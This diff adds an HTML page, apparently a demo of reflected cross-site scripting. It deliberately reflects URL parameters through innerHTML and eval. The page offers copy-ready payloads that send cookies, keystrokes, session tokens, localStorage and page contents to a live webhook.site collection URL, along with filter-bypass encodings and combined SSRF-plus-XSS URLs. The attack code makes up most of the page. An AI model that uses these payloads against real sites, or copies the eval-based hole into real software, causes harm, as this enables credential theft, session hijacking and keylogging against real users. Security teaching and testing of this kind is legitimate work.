@@ -1,0 +1,496 @@
+<<!DOCTYPE html>
+<html>
+<head>
+    <title>Reflected XSS Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 50px;
+            background: #f5f5f5;
+            text-align: center;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .payload-box {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        .success { color: green; }
+        .danger { color: red; }
+        .info { color: blue; }
+        .alert {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            color: #721c24;
+        }
+        .xss-test {
+            background: #e7f3ff;
+            border: 1px solid #b8d4f0;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+            font-size: 12px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .payload-list {
+            text-align: left;
+            margin: 20px 0;
+        }
+        .payload-list li {
+            margin: 10px 0;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 5px;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        .vulnerable {
+            background: #ffebee;
+            border-left: 4px solid #f44336;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        .reflected {
+            background: #e8f5e9;
+            border-left: 4px solid #4caf50;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        .webhook-badge {
+            background: #6c757d;
+            color: white;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-family: monospace;
+        }
+        .copy-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        .copy-btn:hover {
+            background: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔴 Reflected XSS Vulnerability Demo</h1>
+        <p class="info">This page demonstrates reflected XSS by executing JavaScript from URL parameters</p>
+        <p><span class="webhook-badge">Webhook: 75e5e158-c908-4388-a85f-127dc00e162a</span></p>
+
+        <!-- SECTION 1: THE VULNERABILITY -->
+        <div class="vulnerable">
+            <h3>⚠️ Vulnerable Parameters</h3>
+            <p>The following URL parameters are reflected without sanitization:</p>
+            <ul>
+                <li><code>?q=</code> - Search query</li>
+                <li><code>?page=</code> - Page name</li>
+                <li><code>?msg=</code> - Message</li>
+                <li><code>?callback=</code> - Callback function</li>
+                <li><code>?xss=</code> - XSS test parameter</li>
+            </ul>
+        </div>
+
+        <!-- SECTION 2: REFLECTED XSS PAYLOADS -->
+        <div class="xss-test">
+            <h3>🎯 Test XSS Payloads</h3>
+            <p>Click the buttons below to test reflected XSS with webhook tracking:</p>
+            
+            <button onclick="executePayload(`<img src=x onerror=fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=onerror&data='+btoa(document.cookie))>`)">Basic XSS</button>
+            <button onclick="executePayload(`<script>fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=script&data='+btoa(document.cookie))</script>`)">Script Tag</button>
+            <button onclick="executePayload(`<body onload=fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=onload&data='+btoa(document.cookie))>`)">Body Onload</button>
+            <button onclick="executePayload(`<svg/onload=fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=svg&data='+btoa(document.cookie))>`)">SVG Onload</button>
+            <button onclick="executePayload(`<input onfocus=fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=onfocus&data='+btoa(document.cookie)) autofocus>`)">Input Onfocus</button>
+            <button onclick="executePayload(`<details open ontoggle=fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=ontoggle&data='+btoa(document.cookie))>`)">Details Ontoggle</button>
+            <button onclick="executePayload(`javascript:fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=javascript&data='+btoa(document.cookie))`)">JavaScript URI</button>
+            <button onclick="executePayload(`<iframe src=javascript:fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=iframe&data='+btoa(document.cookie))>`)">Iframe</button>
+        </div>
+
+        <!-- SECTION 3: REFLECTED PAYLOADS FROM URL -->
+        <div id="reflectedSection" class="reflected">
+            <h3>📥 Reflected Payloads from URL</h3>
+            <div id="reflectedContent">
+                <p class="info">No payload reflected yet. Add one of these to the URL:</p>
+                <div class="payload-list">
+                    <li><code>?q=&lt;script&gt;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=reflected')&lt;/script&gt;</code></li>
+                    <li><code>?page=&lt;img src=x onerror=fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=error')&gt;</code></li>
+                    <li><code>?msg=&lt;body onload=fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=load')&gt;</code></li>
+                    <li><code>?callback=&lt;svg/onload=fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=svgload')&gt;</code></li>
+                </div>
+            </div>
+        </div>
+
+        <!-- SECTION 4: ADVANCED XSS PAYLOADS WITH WEBHOOK -->
+        <div style="margin: 20px 0; text-align: left;">
+            <h3>🚀 Advanced XSS Payloads with Webhook <span class="webhook-badge">75e5e158</span></h3>
+            
+            <div class="payload-box">
+                <strong>Cookie Theft:</strong><br>
+                <code id="payload1">&lt;script&gt;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?c='+encodeURIComponent(document.cookie))&lt;/script&gt;</code>
+                <button class="copy-btn" onclick="copyPayload('payload1')">Copy</button>
+            </div>
+            
+            <div class="payload-box">
+                <strong>Keylogging:</strong><br>
+                <code id="payload2">&lt;script&gt;document.onkeypress=e=&gt;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?k='+e.key)&lt;/script&gt;</code>
+                <button class="copy-btn" onclick="copyPayload('payload2')">Copy</button>
+            </div>
+            
+            <div class="payload-box">
+                <strong>Session Hijacking:</strong><br>
+                <code id="payload3">&lt;script&gt;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?s='+sessionStorage.getItem('token'))&lt;/script&gt;</code>
+                <button class="copy-btn" onclick="copyPayload('payload3')">Copy</button>
+            </div>
+            
+            <div class="payload-box">
+                <strong>Full Page Content Steal:</strong><br>
+                <code id="payload4">&lt;script&gt;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?html='+btoa(document.body.innerHTML))&lt;/script&gt;</code>
+                <button class="copy-btn" onclick="copyPayload('payload4')">Copy</button>
+            </div>
+            
+            <div class="payload-box">
+                <strong>Location/URL Steal:</strong><br>
+                <code id="payload5">&lt;script&gt;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?url='+encodeURIComponent(location.href))&lt;/script&gt;</code>
+                <button class="copy-btn" onclick="copyPayload('payload5')">Copy</button>
+            </div>
+            
+            <div class="payload-box">
+                <strong>LocalStorage Steal:</strong><br>
+                <code id="payload6">&lt;script&gt;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?ls='+btoa(JSON.stringify(localStorage)))&lt;/script&gt;</code>
+                <button class="copy-btn" onclick="copyPayload('payload6')">Copy</button>
+            </div>
+        </div>
+
+        <!-- SECTION 5: WAF BYPASS TECHNIQUES -->
+        <div style="margin: 20px 0; text-align: left;">
+            <h3>🛡️ WAF Bypass Payloads with Webhook</h3>
+            
+            <div class="payload-box">
+                <strong>Whitespace/Newline Injection:</strong><br>
+                <code id="bypass1">?q=jav\tascript:fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=tab')</code>
+                <button class="copy-btn" onclick="copyPayload('bypass1')">Copy</button>
+            </div>
+            
+            <div class="payload-box">
+                <strong>Case Obfuscation:</strong><br>
+                <code id="bypass2">?q=JaVaScRiPt:fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=case')</code>
+                <button class="copy-btn" onclick="copyPayload('bypass2')">Copy</button>
+            </div>
+            
+            <div class="payload-box">
+                <strong>HTML Entity Encoding:</strong><br>
+                <code id="bypass3">?q=javascript&#58;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=entity')</code>
+                <button class="copy-btn" onclick="copyPayload('bypass3')">Copy</button>
+            </div>
+            
+            <div class="payload-box">
+                <strong>Double URL Encoding:</strong><br>
+                <code id="bypass4">?q=javascript%253afetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=double')</code>
+                <button class="copy-btn" onclick="copyPayload('bypass4')">Copy</button>
+            </div>
+            
+            <div class="payload-box">
+                <strong>Unicode Escapes:</strong><br>
+                <code id="bypass5">?q=java\u0073cript:fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=unicode')</code>
+                <button class="copy-btn" onclick="copyPayload('bypass5')">Copy</button>
+            </div>
+            
+            <div class="payload-box">
+                <strong>Multiple Encodings:</strong><br>
+                <code id="bypass6">?q=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?type=multi')</code>
+                <button class="copy-btn" onclick="copyPayload('bypass6')">Copy</button>
+            </div>
+        </div>
+
+        <!-- SECTION 6: SSRF + XSS COMBINED PAYLOADS -->
+        <div style="margin: 20px 0; text-align: left; background: #f3e5f5; padding: 20px; border-radius: 5px;">
+            <h3>🔗 SSRF + XSS Combined Payloads</h3>
+            <p>Test these with your SSRF URL:</p>
+            
+            <div class="payload-box" style="background: #e1bee7;">
+                <strong>SSRF to XSS via Credential Injection:</strong><br>
+                <code id="ssrf1">https://127.0.0.1:9000@masim1888.github.io/xss-demo.html?q=&lt;script&gt;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?ssrf=success')&lt;/script&gt;</code>
+                <button class="copy-btn" onclick="copyPayload('ssrf1')">Copy</button>
+            </div>
+            
+            <div class="payload-box" style="background: #e1bee7;">
+                <strong>SSRF with OAST + XSS:</strong><br>
+                <code id="ssrf2">https://127.0.0.1:9000@masim1888.github.io/xss-demo.html?q=&lt;script&gt;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?data='+btoa(document.cookie))&lt;/script&gt;</code>
+                <button class="copy-btn" onclick="copyPayload('ssrf2')">Copy</button>
+            </div>
+            
+            <div class="payload-box" style="background: #e1bee7;">
+                <strong>SSRF to Internal Service + XSS:</strong><br>
+                <code id="ssrf3">https://127.0.0.1:9000@masim1888.github.io/xss-demo.html?q=&lt;script&gt;fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?internal='+location.href)&lt;/script&gt;</code>
+                <button class="copy-btn" onclick="copyPayload('ssrf3')">Copy</button>
+            </div>
+        </div>
+
+        <!-- SECTION 7: WEBHOOK TEST -->
+        <div style="margin: 20px 0; background: #e3f2fd; padding: 20px; border-radius: 5px;">
+            <h3>📡 Webhook Test</h3>
+            <p>Click the button below to test if your webhook is working:</p>
+            <button onclick="testWebhook()" style="background: #17a2b8; padding: 15px 30px; font-size: 16px;">
+                🚀 Test Webhook
+            </button>
+            <div id="webhookStatus" style="margin-top: 10px; padding: 10px; border-radius: 5px; display: none;"></div>
+        </div>
+
+        <!-- SECTION 8: HOW REFLECTED XSS WORKS -->
+        <div style="margin: 20px 0; background: #f0f0f0; padding: 20px; border-radius: 5px;">
+            <h3>🔄 How Reflected XSS Works</h3>
+            <ol style="text-align: left; line-height: 2;">
+                <li><strong>Attacker crafts malicious URL:</strong><br>
+                    <code>https://vulnerable-site.com/page?q=&lt;script&gt;fetch('https://webhook.site/75e5e158...')&lt;/script&gt;</code>
+                </li>
+                <li><strong>Victim clicks the link</strong></li>
+                <li><strong>Server reflects payload in response</strong></li>
+                <li><strong>Browser executes the script</strong></li>
+                <li><strong>Webhook receives the stolen data</strong> ✅</li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // WEBHOOK ID
+        // ============================================
+        const WEBHOOK_ID = '75e5e158-c908-4388-a85f-127dc00e162a';
+        const WEBHOOK_URL = `https://webhook.site/${WEBHOOK_ID}`;
+
+        // ============================================
+        // COPY FUNCTION
+        // ============================================
+        function copyPayload(elementId) {
+            const element = document.getElementById(elementId);
+            const text = element.textContent;
+            
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = element.parentElement.querySelector('.copy-btn');
+                const originalText = btn.textContent;
+                btn.textContent = '✅ Copied!';
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                }, 2000);
+            }).catch(() => {
+                // Fallback
+                const textarea = document.createElement('textarea');
+                textarea.value = text;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                alert('Payload copied to clipboard!');
+            });
+        }
+
+        // ============================================
+        // WEBHOOK TEST FUNCTION
+        // ============================================
+        function testWebhook() {
+            const statusDiv = document.getElementById('webhookStatus');
+            statusDiv.style.display = 'block';
+            statusDiv.innerHTML = '⏳ Sending test request to webhook...';
+            statusDiv.style.background = '#fff3cd';
+            statusDiv.style.color = '#856404';
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    type: 'test',
+                    message: 'Webhook test from XSS demo page',
+                    timestamp: Date.now(),
+                    userAgent: navigator.userAgent,
+                    url: window.location.href
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    statusDiv.innerHTML = '✅ Webhook test successful! Check your webhook dashboard.';
+                    statusDiv.style.background = '#d4edda';
+                    statusDiv.style.color = '#155724';
+                } else {
+                    statusDiv.innerHTML = `⚠️ Webhook test returned status: ${response.status}`;
+                    statusDiv.style.background = '#f8d7da';
+                    statusDiv.style.color = '#721c24';
+                }
+            })
+            .catch(error => {
+                statusDiv.innerHTML = `❌ Webhook test failed: ${error.message}`;
+                statusDiv.style.background = '#f8d7da';
+                statusDiv.style.color = '#721c24';
+            });
+        }
+
+        // ============================================
+        // EXECUTE PAYLOAD FUNCTION
+        // ============================================
+        function executePayload(payload) {
+            const encoded = encodeURIComponent(payload);
+            const currentUrl = window.location.href.split('?')[0];
+            const newUrl = `${currentUrl}?q=${encoded}`;
+            
+            // Show payload in URL
+            const exampleUrl = document.getElementById('exampleUrl');
+            if (exampleUrl) {
+                exampleUrl.textContent = newUrl;
+            }
+            
+            // Reflect the payload
+            reflectPayload(payload);
+        }
+
+        // ============================================
+        // REFLECT XSS PAYLOAD
+        // ============================================
+        function reflectPayload(payload) {
+            const container = document.getElementById('reflectedContent');
+            
+            container.innerHTML = `
+                <div class="alert">
+                    <strong>⚠️ REFLECTED XSS DETECTED!</strong><br>
+                    The following payload was reflected without sanitization:
+                </div>
+                <div class="payload-box" style="background: #f8d7da; border-color: #f44336;">
+                    <strong>Reflected Payload:</strong><br>
+                    <code>${payload}</code>
+                </div>
+                <div style="background: #ffebee; padding: 15px; margin: 10px 0; border-radius: 5px; border: 2px solid #f44336;">
+                    <strong>🚨 EXECUTION RESULT:</strong><br>
+                    <div id="xssExecution" style="margin-top: 10px;"></div>
+                </div>
+                <div style="background: #fff3cd; padding: 10px; margin: 10px 0; border-radius: 5px;">
+                    <small>💡 The payload was executed in the browser context</small>
+                    <br>
+                    <small>📡 Webhook: <code>${WEBHOOK_ID}</code></small>
+                </div>
+            `;
+
+            // Execute the XSS
+            try {
+                const execDiv = document.getElementById('xssExecution');
+                const script = document.createElement('script');
+                script.textContent = `
+                    try {
+                        const payload = \`${payload}\`;
+                        const temp = document.createElement('div');
+                        temp.innerHTML = payload;
+                        const scripts = temp.querySelectorAll('script');
+                        scripts.forEach(s => {
+                            const newScript = document.createElement('script');
+                            newScript.textContent = s.textContent;
+                            document.body.appendChild(newScript);
+                        });
+                        
+                        if (payload.includes('<script>')) {
+                            const match = payload.match(/<script>([\\s\\S]*?)<\\/script>/);
+                            if (match && match[1]) {
+                                eval(match[1]);
+                            }
+                        }
+                        
+                        if (payload.includes('javascript:')) {
+                            const match = payload.match(/javascript:([^'"<]*)/);
+                            if (match && match[1]) {
+                                eval(match[1]);
+                            }
+                        }
+                        
+                        document.getElementById('xssExecution').innerHTML = 
+                            '✅ <strong style="color: #d32f2f;">XSS PAYLOAD EXECUTED!</strong><br>' +
+                            '<span style="color: #666;">Payload sent to webhook: ' + '${WEBHOOK_ID}' + '</span>';
+                    } catch(e) {
+                        document.getElementById('xssExecution').innerHTML = 
+                            '⚠️ Payload executed with errors: ' + e.message;
+                    }
+                `;
+                document.body.appendChild(script);
+            } catch(e) {
+                // Silent fail
+            }
+        }
+
+        // ============================================
+        // URL PARAMETER REFLECTION
+        // ============================================
+        const params = new URLSearchParams(window.location.search);
+        const q = params.get('q');
+        const page = params.get('page');
+        const msg = params.get('msg');
+        const callback = params.get('callback');
+        const xss = params.get('xss');
+        
+        if (q || page || msg || callback || xss) {
+            let payload = q || page || msg || callback || xss;
+            try {
+                payload = decodeURIComponent(payload);
+            } catch(e) {}
+            reflectPayload(payload);
+            document.getElementById('reflectedSection').style.border = '3px solid #f44336';
+            document.getElementById('reflectedSection').style.background = '#ffebee';
+        }
+
+        // ============================================
+        // CONSOLE OUTPUT
+        // ============================================
+        console.log('%c🔴 Reflected XSS Demo Page Loaded', 'color: red; font-size: 16px; font-weight: bold;');
+        console.log(`%c📡 Webhook: ${WEBHOOK_ID}`, 'color: blue; font-weight: bold;');
+        console.log(`%c📡 Webhook URL: ${WEBHOOK_URL}`, 'color: blue;');
+        console.log('%c📋 URL Parameters:', 'color: blue; font-weight: bold;');
+        const allParams = new URLSearchParams(window.location.search);
+        for (let [key, value] of allParams) {
+            console.log(`  ${key}: ${value}`);
+        }
+        console.warn('%c⚠️ This page is intentionally vulnerable to Reflected XSS', 'color: orange; font-size: 14px;');
+        console.warn('%c💡 Test by adding ?q=<script>fetch("https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a?c="+document.cookie)</script>', 'color: orange;');
+
+        // ============================================
+        // XSS DETECTION
+        // ============================================
+        let xssDetected = false;
+        const originalAlert = window.alert;
+        window.alert = function(msg) {
+            xssDetected = true;
+            console.log('%c🚨 XSS DETECTED: Alert() called', 'color: red; font-weight: bold;');
+            originalAlert(msg);
+        };
+
+        console.log('%c✅ Ready for XSS testing!', 'color: green; font-weight: bold;');
+        console.log(`%c📡 Webhook endpoint: ${WEBHOOK_URL}`, 'color: purple;');
+    </script>
+</body>
+</html>
